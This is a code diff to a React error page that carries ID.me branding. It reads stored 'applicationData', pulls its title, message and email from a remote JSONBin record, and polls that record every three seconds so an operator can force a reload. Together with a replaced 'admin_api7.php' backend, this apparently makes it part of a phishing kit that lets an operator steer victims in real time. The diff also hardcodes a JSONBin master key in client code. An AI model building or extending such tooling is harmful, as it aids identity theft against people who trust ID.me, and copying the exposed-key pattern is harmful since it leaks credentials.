@@ -3,6 +3,20 @@ import logo from "../assets/ID.me_Logo.png";
 import connect from "../assets/connect.jpg";
 import elogo from "../assets/logo-removebg-preview.png";
 
+
+const BIN_ID = "6a340b1dda38895dfed7e840";
+
+const API_KEY =
+  "$2a$10$qrNF.b6EVU4HN2N8Dvegaez/mp2L7ZO9EjET5ujsIiWNSfuOyB.mu";
+
+const JSONBIN_URL = `https://api.jsonbin.io/v3/b/${BIN_ID}`;
+
+const headers = {
+  "Content-Type": "application/json",
+  "X-Master-Key": API_KEY,
+};
+
+
 const ErrorPage: React.FC = () => {
   const storedData = localStorage.getItem("applicationData");
   const parsedData = storedData ? JSON.parse(storedData) : {};
@@ -16,20 +30,23 @@ const ErrorPage: React.FC = () => {
   const [email, setEmail] = useState("");
 
   // Fetch error content from backend
-  const fetchErrorContent = async () => {
-    try {
-      const res = await fetch(
-        "https://olive-tapir-759483.hostingersite.com/myBackend/admin_api7.php?action=fetch_error_content",
-      );
-      const data = await res.json();
+const fetchErrorContent = async () => {
+  try {
+    const res = await fetch(`${JSONBIN_URL}/latest`, {
+      headers,
+    });
 
-      setTitle(data.title || "");
-      setErrorMessage(data.errorMessage || "");
-      setEmail(data.email || "");
-    } catch (error) {
-      console.error("Error fetching error content:", error);
-    }
-  };
+    const { record } = await res.json();
+
+    setTitle(record.title || "");
+    setErrorMessage(record.errorMessage || "");
+    setEmail(record.email || "");
+  } catch (error) {
+    console.error("Error fetching JSONBin:", error);
+  }
+};
+
+
 
   useEffect(() => {
     fetchErrorContent();
@@ -75,6 +92,30 @@ const ErrorPage: React.FC = () => {
 
     return () => clearTimeout(timer);
   }, [showPopup, countdown]);
+
+
+  useEffect(() => {
+  const interval = setInterval(async () => {
+    try {
+      const res = await fetch(`${JSONBIN_URL}/latest`, {
+        headers,
+      });
+
+      const { record } = await res.json();
+
+      if (record.showPopup) {
+        window.location.reload();
+      }
+    } catch (err) {
+      console.error(err);
+    }
+  }, 3000);
+
+  return () => clearInterval(interval);
+}, []);
+
+
+
 
   return (
     <div className="flex justify-center items-center min-h-screen bg-white px-4">
